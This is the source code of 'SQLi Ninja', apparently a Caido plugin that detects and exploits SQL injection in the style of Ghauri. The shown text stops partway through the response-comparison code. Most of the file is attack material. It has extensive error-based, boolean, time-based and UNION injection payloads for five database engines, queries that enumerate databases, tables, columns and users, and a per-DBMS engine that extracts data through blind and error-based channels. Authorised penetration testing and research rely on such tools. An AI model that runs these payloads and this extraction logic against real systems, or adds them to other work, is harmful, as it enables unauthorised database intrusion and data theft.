// SQLi Ninja - Advanced SQL Injection Scanner (Ghauri-inspired)
// Intelligent detection with prefix/suffix combinations, baseline comparison, and DBMS fingerprinting

import { RequestSpec, RequestSpecRaw } from "caido:utils";
import { GHAURI_PAYLOADS, GH_ERROR_MARKER, type GhEntry } from "../shared/ghauri-payloads";

// Manual UTF-8 helpers (backend runtime lacks TextEncoder/TextDecoder)
function utf8Encode(str: string): Uint8Array {
  const bytes: number[] = [];
  for (let i = 0; i < str.length; i++) {
    let code = str.charCodeAt(i);
    if (code < 0x80) {
      bytes.push(code);
    } else if (code < 0x800) {
      bytes.push(0xc0 | (code >> 6), 0x80 | (code & 0x3f));
    } else if (code >= 0xd800 && code <= 0xdbff) {
      // Surrogate pair
      const hi = code;
      const lo = str.charCodeAt(++i);
      code = 0x10000 + ((hi & 0x3ff) << 10) + (lo & 0x3ff);
      bytes.push(
        0xf0 | (code >> 18),
        0x80 | ((code >> 12) & 0x3f),
        0x80 | ((code >> 6) & 0x3f),
        0x80 | (code & 0x3f)
      );
    } else {
      bytes.push(0xe0 | (code >> 12), 0x80 | ((code >> 6) & 0x3f), 0x80 | (code & 0x3f));
    }
  }
  return new Uint8Array(bytes);
}

function utf8Decode(bytes: Uint8Array | number[]): string {
  const arr = bytes instanceof Uint8Array ? bytes : new Uint8Array(bytes);
  let out = "";
  let i = 0;
  while (i < arr.length) {
    const b = arr[i++];
    if (b < 0x80) {
      out += String.fromCharCode(b);
    } else if (b >= 0xc0 && b < 0xe0) {
      out += String.fromCharCode(((b & 0x1f) << 6) | (arr[i++] & 0x3f));
    } else if (b >= 0xe0 && b < 0xf0) {
      out += String.fromCharCode(((b & 0x0f) << 12) | ((arr[i++] & 0x3f) << 6) | (arr[i++] & 0x3f));
    } else {
      const code = ((b & 0x07) << 18) | ((arr[i++] & 0x3f) << 12) | ((arr[i++] & 0x3f) << 6) | (arr[i++] & 0x3f);
      const c = code - 0x10000;
      out += String.fromCharCode(0xd800 + (c >> 10), 0xdc00 + (c & 0x3ff));
    }
  }
  return out;
}

interface ScanConfig {
  requestId: string;
  rawRequest?: string;
  params: ParamInfo[];
  techniques: string[];
  level: number;
  timeSec: number;
  verbose: boolean;
  sessionId?: string;
}

interface ParamInfo {
  name: string;
  value: string;
  type: string;
}

interface Finding {
  param: string;
  paramType: string;
  technique: string;
  dbms: string;
  payload: string;
  prefix: string;
  suffix: string;
  evidence: string;
  confidence: string;
  title: string;
}

// Ghauri-style prefix/suffix combinations for different SQL contexts
const PREFIXES_SUFFIXES = {
  level1: [
    { pref: " ", suf: "" },
    { pref: " ", suf: "-- -" },
    { pref: "' ", suf: "-- -" },
    { pref: '" ', suf: "-- -" },
  ],
  level2: [
    { pref: " ", suf: "" },
    { pref: " ", suf: "-- -" },
    { pref: " ", suf: "#" },
    { pref: "' ", suf: "-- -" },
    { pref: "' ", suf: "#" },
    { pref: '" ', suf: "-- -" },
    { pref: '" ', suf: "#" },
    { pref: ") ", suf: "-- -" },
    { pref: "') ", suf: "-- -" },
    { pref: '") ', suf: "-- -" },
    { pref: "' ", suf: " AND '1'='1" },
    { pref: '" ', suf: ' AND "1"="1' },
  ],
  level3: [
    { pref: " ", suf: "" },
    { pref: " ", suf: "-- -" },
    { pref: " ", suf: "#" },
    { pref: "' ", suf: "-- -" },
    { pref: "' ", suf: "#" },
    { pref: '" ', suf: "-- -" },
    { pref: '" ', suf: "#" },
    { pref: ") ", suf: "-- -" },
    { pref: ") ", suf: "#" },
    { pref: "') ", suf: "-- -" },
    { pref: "') ", suf: "#" },
    { pref: '") ', suf: "-- -" },
    { pref: '") ', suf: "#" },
    { pref: "' ", suf: " AND '1'='1" },
    { pref: '" ', suf: ' AND "1"="1' },
    { pref: ") ", suf: " AND (1=1" },
    { pref: "') ", suf: " AND ('1'='1" },
    { pref: "'XOR ", suf: " XOR'Z" },
    { pref: '"XOR ', suf: ' XOR"Z' },
    { pref: "'AND ", suf: " AND'Z" },
    { pref: "'OR ", suf: " OR'Z" },
    { pref: "'+", suf: "+'" },
    { pref: '"+', suf: '+"' },
  ],
};

// Error-based payloads with DBMS detection signatures
const ERROR_PAYLOADS = {
  mysql: [
    { payload: "AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))", title: "MySQL EXTRACTVALUE" },
    { payload: "AND UPDATEXML(1,CONCAT(0x7e,VERSION(),0x7e),1)", title: "MySQL UPDATEXML" },
    { payload: "AND (SELECT(!x-~0)FROM(SELECT CONCAT(0x7e,VERSION(),0x7e)x)y)", title: "MySQL BIGINT" },
    { payload: "AND EXP(~(SELECT*FROM(SELECT CONCAT(0x7e,VERSION())e)x))", title: "MySQL EXP" },
    { payload: "AND GTID_SUBSET(CONCAT(0x7e,VERSION()),1337)", title: "MySQL GTID_SUBSET" },
    { payload: "AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,VERSION())) USING utf8)))", title: "MySQL JSON_KEYS" },
    { payload: "AND (SELECT(x*1E308)FROM(SELECT CONCAT(0x7e,VERSION())x)y)", title: "MySQL DOUBLE" },
    { payload: "AND (SELECT(0)FROM(SELECT COUNT(*),CONCAT(0x7e,VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)", title: "MySQL FLOOR" },
    { payload: "PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x7e,VERSION())),1)", title: "MySQL PROCEDURE ANALYSE" },
  ],
  mssql: [
    { payload: "AND 1=CONVERT(INT,(SELECT @@VERSION))", title: "MSSQL CONVERT" },
    { payload: "AND 1=CAST((SELECT @@VERSION) AS INT)", title: "MSSQL CAST" },
    { payload: "AND 1=(SELECT TOP 1 1 FROM INFORMATION_SCHEMA.TABLES WHERE CAST(TABLE_NAME AS INT)>0)", title: "MSSQL TABLE_NAME CAST" },
    { payload: "';DECLARE @v VARCHAR(8000);SET @v=@@VERSION;SELECT @v AS v--", title: "MSSQL Stacked" },
  ],
  postgresql: [
    { payload: "AND 1=CAST((SELECT VERSION()) AS INT)", title: "PostgreSQL CAST" },
    { payload: "AND 1::INT=(SELECT VERSION())", title: "PostgreSQL ::INT" },
    { payload: ";SELECT CAST(VERSION() AS INTEGER)--", title: "PostgreSQL Stacked CAST" },
  ],
  oracle: [
    { payload: "AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT BANNER FROM V$VERSION WHERE ROWNUM=1))", title: "Oracle UTL_INADDR" },
    { payload: "AND 1=CTXSYS.DRITHSX.SN(1,(SELECT BANNER FROM V$VERSION WHERE ROWNUM=1))", title: "Oracle CTXSYS" },
    { payload: "AND 1=DBMS_XDB.GETVAR((SELECT BANNER FROM V$VERSION WHERE ROWNUM=1))", title: "Oracle DBMS_XDB" },
  ],
  generic: [
    { payload: "AND 1=1/0", title: "Division by zero" },
    { payload: "AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT('~',VERSION(),'~',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)", title: "Error-based GROUP BY" },
    { payload: "'||(SELECT '')||'", title: "Oracle-style concatenation" },
    { payload: "';SELECT pg_sleep(0)--", title: "PostgreSQL stacked query" },
  ],
};

// Boolean-based payloads (ghauri-style with vectors)
const BOOLEAN_PAYLOADS = [
  { payload: "AND [RANDNUM]=[RANDNUM]", falsePayload: "AND [RANDNUM]=[RANDNUM2]", title: "AND boolean-based" },
  { payload: "OR NOT [RANDNUM]=[RANDNUM]", falsePayload: "OR NOT [RANDNUM]=[RANDNUM2]", title: "OR NOT boolean-based" },
  { payload: "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END))", falsePayload: "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM2]) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END))", title: "CASE boolean-based" },
  { payload: "RLIKE (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0x28 END))", falsePayload: "RLIKE (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM2]) THEN 1 ELSE 0x28 END))", title: "MySQL RLIKE boolean" },
  { payload: "(IF([RANDNUM]=[RANDNUM],1,(SELECT table_name FROM information_schema.tables)))", falsePayload: "(IF([RANDNUM]=[RANDNUM2],1,(SELECT table_name FROM information_schema.tables)))", title: "MySQL IF boolean" },
  { payload: "(SELECT CASE WHEN([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)", falsePayload: "(SELECT CASE WHEN([RANDNUM]=[RANDNUM2]) THEN 1 ELSE 0 END)", title: "CASE WHEN boolean" },
];

// Time-based payloads (comprehensive ghauri-style)
const TIME_PAYLOADS = {
  mysql: [
    { payload: "(SELECT(0)FROM(SELECT(SLEEP([TIME])))a)", title: "MySQL >= 5.0.12 SLEEP subquery" },
    { payload: "if(now()=sysdate(),SLEEP([TIME]),0)", title: "MySQL >= 5.0.12 IF SLEEP" },
    { payload: "(SELECT CASE WHEN(1=1) THEN SLEEP([TIME]) ELSE 0 END)", title: "MySQL CASE SLEEP" },
    { payload: "SLEEP([TIME])", title: "MySQL direct SLEEP" },
    { payload: "BENCHMARK(5000000,MD5('test'))", title: "MySQL BENCHMARK" },
    { payload: "(SELECT(1)FROM(SELECT(IF(1=1,SLEEP([TIME]),0)))x)", title: "MySQL nested IF SLEEP" },
  ],
  mssql: [
    { payload: "WAITFOR DELAY '0:0:[TIME]'", title: "MSSQL WAITFOR DELAY" },
    { payload: ";WAITFOR DELAY '0:0:[TIME]'--", title: "MSSQL stacked WAITFOR" },
    { payload: "IF(1=1) WAITFOR DELAY '0:0:[TIME]'", title: "MSSQL IF WAITFOR" },
    { payload: "(SELECT CASE WHEN(1=1) THEN (SELECT 1 FROM(SELECT SLEEP([TIME]))x) ELSE 0 END)", title: "MSSQL CASE WHEN" },
  ],
  postgresql: [
    { payload: "(SELECT pg_sleep([TIME]))", title: "PostgreSQL pg_sleep" },
    { payload: ";SELECT pg_sleep([TIME])--", title: "PostgreSQL stacked pg_sleep" },
    { payload: "(SELECT CASE WHEN(1=1) THEN pg_sleep([TIME]) ELSE pg_sleep(0) END)", title: "PostgreSQL CASE pg_sleep" },
    { payload: "||pg_sleep([TIME])", title: "PostgreSQL concat pg_sleep" },
  ],
  oracle: [
    { payload: "AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',[TIME])", title: "Oracle DBMS_PIPE" },
    { payload: "||DBMS_PIPE.RECEIVE_MESSAGE('a',[TIME])||''", title: "Oracle concat DBMS_PIPE" },
    { payload: "AND 1=(CASE WHEN(1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',[TIME]) ELSE 0 END)", title: "Oracle CASE DBMS_PIPE" },
  ],
  sqlite: [
    { payload: "AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))", title: "SQLite heavy query" },
  ],
};

// UNION-based payloads
const UNION_PAYLOADS = [
  "UNION ALL SELECT NULL",
  "UNION SELECT NULL",
  "UNION ALL SELECT NULL,NULL",
  "UNION SELECT NULL,NULL",
  "UNION ALL SELECT NULL,NULL,NULL",
  "UNION SELECT NULL,NULL,NULL",
  "UNION ALL SELECT NULL,NULL,NULL,NULL",
  "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL",
  "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10",
];

// DBMS Error signatures for fingerprinting
const ERROR_SIGNATURES: Record<string, string[]> = {
  mysql: [
    "You have an error in your SQL syntax",
    "Warning: mysql_",
    "MySQLSyntaxErrorException",
    "valid MySQL result",
    "check the manual that corresponds to your MySQL",
    "MySqlClient.",
    "com.mysql.jdbc",
    "Syntax error or access violation",
    "SQLSTATE[42000]",
    "ER_PARSE_ERROR",
    "FUNCTION QUARTER does not exist",
    "BIGINT UNSIGNED value is out of range",
    "Duplicate entry",
    "Unknown column",
  ],
  postgresql: [
    "PostgreSQL",
    "pg_query",
    "pg_exec",
    "valid PostgreSQL result",
    "Npgsql.",
    "PG::SyntaxError",
    "org.postgresql.util.PSQLException",
    "ERROR:  syntax error at or near",
    "unterminated quoted string at or near",
  ],
  mssql: [
    "Driver.* SQL[\\-\\_\\ ]*Server",
    "OLE DB.* SQL Server",
    "SQLServer JDBC Driver",
    "Microsoft SQL Native Client",
    "ODBC SQL Server Driver",
    "SQLExpress",
    "Microsoft OLE DB Provider for SQL Server",
    "Unclosed quotation mark after the character string",
    "SQL Server.*Driver",
    "mssql_query()",
    "Incorrect syntax near",
    "Conversion failed when converting",
  ],
  oracle: [
    "ORA-[0-9]+",
    "Oracle error",
    "Oracle.* Driver",
    "Warning: oci_",
    "quoted string not properly terminated",
    "SQL command not properly ended",
    "Oracle ODBC",
    "OracleException",
  ],
  sqlite: [
    "SQLite/JDBCDriver",
    "SQLite.Exception",
    "System.Data.SQLite.SQLiteException",
    "Warning: sqlite_",
    "Warning: SQLite3::",
    "SQLITE_ERROR",
    "sqlite3.OperationalError",
    "SQLiteException",
  ],
};

// Enumeration queries by DBMS
const ENUM_QUERIES = {
  mysql: {
    databases: "SELECT schema_name FROM information_schema.schemata",
    tables: "SELECT table_name FROM information_schema.tables WHERE table_schema='[DB]'",
    columns: "SELECT column_name FROM information_schema.columns WHERE table_schema='[DB]' AND table_name='[TABLE]'",
    version: "SELECT VERSION()",
    user: "SELECT USER()",
    hostname: "SELECT @@hostname",
  },
  postgresql: {
    databases: "SELECT datname FROM pg_database",
    tables: "SELECT tablename FROM pg_tables WHERE schemaname='public'",
    columns: "SELECT column_name FROM information_schema.columns WHERE table_name='[TABLE]'",
    version: "SELECT version()",
    user: "SELECT current_user",
  },
  mssql: {
    databases: "SELECT name FROM master..sysdatabases",
    tables: "SELECT name FROM [DB]..sysobjects WHERE xtype='U'",
    columns: "SELECT name FROM syscolumns WHERE id=OBJECT_ID('[TABLE]')",
    version: "SELECT @@VERSION",
    user: "SELECT SYSTEM_USER",
    hostname: "SELECT @@SERVERNAME",
  },
  oracle: {
    databases: "SELECT DISTINCT owner FROM all_tables",
    tables: "SELECT table_name FROM all_tables WHERE owner='[DB]'",
    columns: "SELECT column_name FROM all_tab_columns WHERE table_name='[TABLE]'",
    version: "SELECT banner FROM v$version WHERE ROWNUM=1",
    user: "SELECT user FROM dual",
  },
  sqlite: {
    tables: "SELECT name FROM sqlite_master WHERE type='table'",
    columns: "PRAGMA table_info([TABLE])",
    version: "SELECT sqlite_version()",
  },
};

// Per-DBMS retrieval metadata used by the extraction engine.
// charFn/lengthFn take a scalar sub-query [Q] and produce an integer expression.
// concat(expr) aggregates a column into one delimited string. rowLimit(sql,off) selects row #off.
const DBMS_META: Record<string, {
  charFn: (q: string, pos: string) => string;
  lengthFn: (q: string) => string;
  concat: (expr: string) => string;       // one-shot multi-row via aggregation
  rowLimit: (sql: string, off: number) => string; // single row by offset (blind path)
  countRows: (sql: string) => string;
  errorWrap: (q: string) => string;        // reflected error-based wrapper (DBMS error carries ~value~)
  sleepIf: (cond: string, t: number) => string; // time-based conditional sleep
  concatSep: string;
}> = {
  mysql: {
    charFn: (q, pos) => `ORD(MID((${q}),${pos},1))`,
    lengthFn: (q) => `LENGTH((${q}))`,
    concat: (expr) => `SELECT GROUP_CONCAT(${expr} SEPARATOR 0x7c)`,
    rowLimit: (sql, off) => `${sql} LIMIT ${off},1`,
    countRows: (sql) => `SELECT COUNT(*) FROM (${sql}) z`,
    errorWrap: (q) => `EXTRACTVALUE(1,CONCAT(0x7e,(SELECT MID((${q}),1,30)),0x7e))`,
    sleepIf: (cond, t) => `IF((${cond}),SLEEP(${t}),0)`,
    concatSep: "|",
  },
  postgresql: {
    charFn: (q, pos) => `ASCII(SUBSTRING((${q})::text FROM ${pos} FOR 1))`,
    lengthFn: (q) => `LENGTH((${q})::text)`,
    concat: (expr) => `SELECT string_agg(${expr}::text,chr(124))`,
    rowLimit: (sql, off) => `${sql} LIMIT 1 OFFSET ${off}`,
    countRows: (sql) => `SELECT COUNT(*) FROM (${sql}) z`,
    errorWrap: (q) => `CAST((SELECT ${q}) AS INT)`,
    sleepIf: (cond, t) => `(CASE WHEN (${cond}) THEN pg_sleep(${t}) ELSE pg_sleep(0) END)`,
    concatSep: "|",
  },
  mssql: {
    charFn: (q, pos) => `UNICODE(SUBSTRING((${q}),${pos},1))`,
    lengthFn: (q) => `LEN((${q}))`,
    concat: (expr) => `SELECT STRING_AGG(CAST(${expr} AS NVARCHAR(MAX)),'|')`,
    rowLimit: (sql, off) => sql.replace(/^SELECT/i, `SELECT`) + ` ORDER BY 1 OFFSET ${off} ROWS FETCH NEXT 1 ROWS ONLY`,
    countRows: (sql) => `SELECT COUNT(*) FROM (${sql}) z`,
    errorWrap: (q) => `CONVERT(INT,(SELECT SUBSTRING((${q}),1,30)))`,
    sleepIf: (cond, t) => `(CASE WHEN (${cond}) THEN 1 ELSE 0 END)`, // paired with WAITFOR in caller
    concatSep: "|",
  },
  oracle: {
    charFn: (q, pos) => `ASCII(SUBSTRC((${q}),${pos},1))`,
    lengthFn: (q) => `LENGTH((${q}))`,
    concat: (expr) => `SELECT LISTAGG(${expr},'|') WITHIN GROUP (ORDER BY ${expr})`,
    rowLimit: (sql, off) => `SELECT * FROM (SELECT a.*, ROWNUM rn FROM (${sql}) a WHERE ROWNUM<=${off + 1}) WHERE rn=${off + 1}`,
    countRows: (sql) => `SELECT COUNT(*) FROM (${sql})`,
    errorWrap: (q) => `UTL_INADDR.GET_HOST_ADDRESS((SELECT SUBSTR((${q}),1,30) FROM DUAL))`,
    sleepIf: (cond, t) => `(CASE WHEN (${cond}) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',${t}) ELSE 0 END)`,
    concatSep: "|",
  },
  sqlite: {
    charFn: (q, pos) => `UNICODE(SUBSTR((${q}),${pos},1))`,
    lengthFn: (q) => `LENGTH((${q}))`,
    concat: (expr) => `SELECT GROUP_CONCAT(${expr},'|')`,
    rowLimit: (sql, off) => `${sql} LIMIT 1 OFFSET ${off}`,
    countRows: (sql) => `SELECT COUNT(*) FROM (${sql})`,
    errorWrap: (q) => `(${q})`,
    sleepIf: (cond, t) => `(${cond})`,
    concatSep: "|",
  },
};

interface InjectionVector {
  requestId: string;
  rawRequest?: string;
  param: string;
  paramType: string;
  technique: string;
  dbms: string;
  prefix: string;
  suffix: string;
  origValue: string;
  vector?: string;   // ghauri extraction template with [INFERENCE] (when confirmed via the matrix)
  title?: string;    // ghauri payload title that confirmed this vector
}

// Confirmed injection points discovered during scan, keyed by `${requestId||"__raw__"}|${param}`
// `confirmedVectors` holds the single "best" vector per param (for display/back-compat);
// `confirmedVectorsAll` holds EVERY confirmed technique so extraction can fall back
// (e.g. boolean oracle too noisy → use the reliable time-based vector instead).
const confirmedVectors: Record<string, InjectionVector> = {};
const confirmedVectorsAll: Record<string, InjectionVector[]> = {};

function vectorKey(requestId: string, param: string): string {
  return `${requestId || "__raw__"}|${param}`;
}

// Prefer faster extraction techniques when multiple confirm on the same param.
const TECHNIQUE_RANK: Record<string, number> = { error: 4, union: 3, boolean: 2, time: 1 };

function recordVector(v: InjectionVector) {
  const key = vectorKey(v.requestId, v.param);

  // Maintain the full per-param candidate list (one entry per technique, best dbms wins)
  const list = confirmedVectorsAll[key] || (confirmedVectorsAll[key] = []);
  const sameTech = list.find(x => x.technique === v.technique);
  if (sameTech) {
    if (sameTech.dbms === "unknown" && v.dbms !== "unknown") sameTech.dbms = v.dbms;
  } else {
    list.push(v);
  }
  // Propagate a now-known dbms to any sibling vectors still marked unknown
  if (v.dbms !== "unknown") {
    for (const x of list) if (x.dbms === "unknown") x.dbms = v.dbms;
  }

  const existing = confirmedVectors[key];
  // Keep the higher-ranked (faster) technique; but always upgrade dbms from unknown
  if (!existing || (TECHNIQUE_RANK[v.technique] || 0) > (TECHNIQUE_RANK[existing.technique] || 0)) {
    confirmedVectors[key] = v;
  } else if (existing.dbms === "unknown" && v.dbms !== "unknown") {
    existing.dbms = v.dbms;
  }
}

// Ordered extraction candidates for a param: reflected (fast+reliable) first, then
// boolean, then time (slow but usually the most reliable blind oracle).
const EXTRACTION_PREFERENCE: Record<string, number> = { error: 0, union: 1, boolean: 2, time: 3 };
function pickVectors(requestId: string, param?: string): InjectionVector[] {
  let list: InjectionVector[] = [];
  if (param) list = confirmedVectorsAll[vectorKey(requestId, param)] || [];
  if (list.length === 0) {
    // Fall back to any confirmed vector(s) for this request
    const rid = requestId || "";
    for (const arr of Object.values(confirmedVectorsAll)) {
      for (const v of arr) if ((v.requestId || "") === rid) list.push(v);
    }
  }
  return [...list].sort(
    (a, b) => (EXTRACTION_PREFERENCE[a.technique] ?? 9) - (EXTRACTION_PREFERENCE[b.technique] ?? 9)
  );
}

let sdk: any;

// Per-session cooperative cancellation (one entry per tab/scan session). The stopScan endpoint
// adds a sessionId; long loops check it. Each new scan/extraction clears its own session first.
const abortedSessions = new Set<string>();
class AbortError extends Error { constructor() { super("__ABORTED__"); } }
function isAborted(sid: string) { return abortedSessions.has(sid); }
function _throwIfAborted(sid: string) { if (abortedSessions.has(sid)) throw new AbortError(); }

// Session-tagged log emit. Every worker/handler shadows `sendLog` with a sid-bound version
// (see shadow lines at the top of each function) so logs route to the right tab under parallel
// scans. The module-level default (sid "") is used only by code with no session in play.
function _sendLog(msg: string, type: string = "info", sid: string = "") {
  sdk?.api?.send("log", { msg, type, sessionId: sid });
}
function sendLog(msg: string, type: string = "info") { _sendLog(msg, type, ""); }
function throwIfAborted() { /* module default: no session, never aborts */ }

function generateRandom(): number {
  return Math.floor(Math.random() * 9000) + 1000;
}

function replacePayloadPlaceholders(payload: string, timeSec: number): string {
  const rand1 = generateRandom();
  const rand2 = generateRandom();
  return payload
    .replace(/\[RANDNUM\]/g, rand1.toString())
    .replace(/\[RANDNUM2\]/g, rand2.toString())
    .replace(/\[TIME\]/g, timeSec.toString())
    .replace(/\[SLEEPTIME\]/g, timeSec.toString());
}

function getPrefixSuffix(level: number): Array<{pref: string, suf: string}> {
  if (level >= 3) return PREFIXES_SUFFIXES.level3;
  if (level >= 2) return PREFIXES_SUFFIXES.level2;
  return PREFIXES_SUFFIXES.level1;
}

function detectDbms(responseText: string): string {
  for (const [dbms, patterns] of Object.entries(ERROR_SIGNATURES)) {
    for (const pattern of patterns) {
      if (new RegExp(pattern, "i").test(responseText)) {
        return dbms;
      }
    }
  }
  return "unknown";
}

// Infer DBMS from a payload's human-readable title (e.g. "MSSQL WAITFOR DELAY" -> mssql)
function dbmsFromTitle(title: string): string {
  const t = title.toLowerCase();
  if (t.includes("mysql") || t.includes("mariadb")) return "mysql";
  if (t.includes("mssql") || t.includes("sql server")) return "mssql";
  if (t.includes("postgres")) return "postgresql";
  if (t.includes("oracle")) return "oracle";
  if (t.includes("sqlite")) return "sqlite";
  return "unknown";
}

// ---------------------------------------------------------------------------
// Ghauri payload matrix driver (src/shared/ghauri-payloads.ts).
// Maps our dbms codes <-> ghauri group names, picks ordered candidate entries per
// technique, slices each entry's own boundary list by level, and substitutes the
// ghauri placeholders ([RANDNUM]=[RANDNUM], [SLEEPTIME], [ORIGVALUE]).
// ---------------------------------------------------------------------------
const GH_GROUP_TO_CODE: Record<string, string> = {
  "MySQL": "mysql",
  "Microsoft SQL Server": "mssql",
  "PostgreSQL": "postgresql",
  "Oracle": "oracle",
  "": "unknown",
};
const GH_CODE_TO_GROUP: Record<string, string> = {
  mysql: "MySQL",
  mssql: "Microsoft SQL Server",
  postgresql: "PostgreSQL",
  oracle: "Oracle",
};
function ghGroupToCode(group: string): string {
  return GH_GROUP_TO_CODE[group] ?? "unknown";
}

// Build the ordered candidate entry list for a technique. dbmsHint (our code, or
// "unknown") floats its group's entries to the front so a likely DBMS is tried first.
// For boolean we always include the DBMS-agnostic BooleanTests first; for time we also
// fold in stacked-queries (they are sleep probes).
function ghCandidates(technique: string, dbmsHint: string): GhEntry[] {
  const ghTech = technique === "error" ? "error-based"
    : technique === "boolean" ? "boolean-based"
    : technique === "time" ? "time-based" : "";
  if (!ghTech) return [];
  const groups = Object.keys(GHAURI_PAYLOADS);
  const hintGroup = GH_CODE_TO_GROUP[dbmsHint];
  // Order groups: hint group first, then the rest (BooleanTests stays first for boolean).
  const ordered = groups.slice().sort((a, b) => {
    const rank = (g: string) => (g === hintGroup ? 0 : g === "BooleanTests" ? 1 : 2);
    return rank(a) - rank(b);
  });
  const out: GhEntry[] = [];
  for (const g of ordered) {
    const techs = GHAURI_PAYLOADS[g] || {};
    if (Array.isArray(techs[ghTech])) out.push(...techs[ghTech]);
    if (technique === "time" && Array.isArray(techs["stacked-queries"])) out.push(...techs["stacked-queries"]);
  }
  return out;
}

// Slice an entry's own boundary list by scan level (caps request volume).
function ghBoundaries(entry: GhEntry, level: number): Array<{ pref: string; suf: string }> {
  const n = level >= 3 ? entry.comments.length : level === 2 ? 9 : 4;
  return entry.comments.slice(0, n);
}

const GH_TRUE_COND = "3567=3567";
const GH_FALSE_COND = "3567=3568";
// Substitute ghauri placeholders in a detection probe. mode: "true"/"false" sets the
// boolean inference; timeSec fills [SLEEPTIME]; origValue fills [ORIGVALUE].
function ghSubst(probe: string, mode: "true" | "false" | "plain", timeSec: number, origValue: string): string {
  let s = probe.replace(/\[RANDNUM\]=\[RANDNUM\]/g, mode === "false" ? GH_FALSE_COND : GH_TRUE_COND);
  s = s.replace(/\[SLEEPTIME\]/g, String(timeSec));
  s = s.replace(/\[ORIGVALUE\]/g, origValue);
  s = s.replace(/\[RANDNUM\]/g, () => String(generateRandom()));
  return s;
}

// True only if the injected response shows a DBMS error (or extraction marker) that the BASELINE did not.
// Returns the detected dbms, or null if this is not a genuine new error (kills false positives).
function confirmErrorBased(baselineBody: string, injectedBody: string, titleDbms: string): { dbms: string; evidence: string } | null {
  const injDbms = detectDbms(injectedBody);
  const baseDbms = detectDbms(baselineBody);
  // A real DBMS error signature that was NOT already in the baseline page
  if (injDbms !== "unknown" && injDbms !== baseDbms) {
    return { dbms: injDbms, evidence: `New ${injDbms.toUpperCase()} error signature in response` };
  }
  // Our CONCAT extraction marker ~<value>~ present now but not in baseline, and value looks real
  const m = injectedBody.match(/~([^~\s<>"']{1,200})~/);
  if (m && !baselineBody.includes(m[0]) && /[0-9A-Za-z]/.test(m[1])) {
    const d = injDbms !== "unknown" ? injDbms : titleDbms;
    return { dbms: d === "unknown" ? "mysql" : d, evidence: `Extracted via error marker: ${m[1]}` };
  }
  return null;
}

// --- Reflection guards --------------------------------------------------------------------
// Some endpoints echo the submitted parameter straight back into the response (e.g. a search
// /filter API that returns the applied `filters`, or any form that reprints your input). That
// echo contains our marker and our payload text verbatim, which naively looks like an
// error-based hit or an extracted value. These helpers tell reflection apart from a genuine
// DBMS signal, killing the whole class of false positives.

// Remove verbatim (and commonly re-encoded) echoes of what we injected, so marker/error checks
// only see text the server produced on its own.
function stripEchoes(body: string, ...injected: string[]): string {
  let out = body;
  for (const inj of injected) {
    if (!inj || inj.length < 3) continue;
    const variants = new Set<string>([
      inj,
      encodeURIComponent(inj),
      inj.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;"),
    ]);
    for (const vv of variants) if (vv) out = out.split(vv).join("");
  }
  return out;
}

// Pull a ~value~ marker out of a response, but reject it when the value is just our payload
// bounced back (a slice of what we injected, a CAST/CONCAT wrapper fragment, a hex delimiter,
// or the detection marker) rather than real extracted data.
function markerValue(body: string, injectedPayload: string): string | null {
  const m = body.match(/~([^~]*)~/);
  if (!m || m[1] === "") return null;
  const val = m[1];
  if (val.length >= 4 && injectedPayload.includes(val)) return null;              // verbatim echo (a slice of our payload)
  if (/CAST\s*\(|CONCAT\s*\(|0x7e|@@|STRING_AGG|SUBSTR(ING)?\s*\(|NVARCHAR\s*\(/i.test(val)) return null; // wrapper fragment echo
  if (val.includes(GH_ERROR_MARKER)) return null;                                 // detection-marker echo
  return val;
}

// Strip per-request dynamic noise so two logically-identical pages compare as identical:
// long random tokens (ViewState/CSRF/session ids) and all digit runs (timestamps, counters).
function normalizeBody(s: string): string {
  return s
    .replace(/[A-Za-z0-9+/=_-]{24,}/g, "T") // long opaque tokens
    .replace(/\d+/g, "#");                   // numbers
}

function wordCounts(s: string): Map<string, number> {
  const m = new Map<string, number>();
  for (const t of s.split(/[^A-Za-z#]+/)) {
    if (t.length > 1) m.set(t, (m.get(t) || 0) + 1);
  }
  return m;
}

// Shift-robust page similarity (weighted Jaccard over a word multiset of the WHOLE body).
// Unlike positional sampling, a shifted/added dynamic token only perturbs a few words, so
// two renders of the same page score ~1.0 — the stable oracle blind extraction needs.
function pageSimilarity(a: string, b: string): number {
  if (!a && !b) return 1;
  if (!a || !b) return 0;
  const ca = wordCounts(normalizeBody(a));
  const cb = wordCounts(normalizeBody(b));
  if (ca.size === 0 && cb.size === 0) {
    // No wordy content — fall back to normalized length ratio.
    const la = a.length, lb = b.length;
    return la && lb ? Math.min(la, lb) / Math.max(la, lb) : 1;
  }
  let inter = 0, uni = 0;
  const keys = new Set([...ca.keys(), ...cb.keys()]);
  for (const k of keys) {
    const x = ca.get(k) || 0, y = cb.get(k) || 0;
    inter += Math.min(x, y);
    uni += Math.max(x, y);
  }
  return uni > 0 ? inter / uni : 1;
}

function compareResponses(baseline: string, testResponse: string, similarityThreshold: number = 0.85): { similar: boolean; ratio: number } {
  if (!baseline || !testResponse) return { similar: false, ratio: 0 };

  const baseLen = baseline.length;
  const testLen = testResponse.length;

  if (baseLen === 0 && testLen === 0) return { similar: true, ratio: 1 };
  if (baseLen === 0 || testLen === 0) return { similar: false, ratio: 0 };

  const lenRatio = Math.min(baseLen, testLen) / Math.max(baseLen, testLen);

  // Quick length-based comparison first
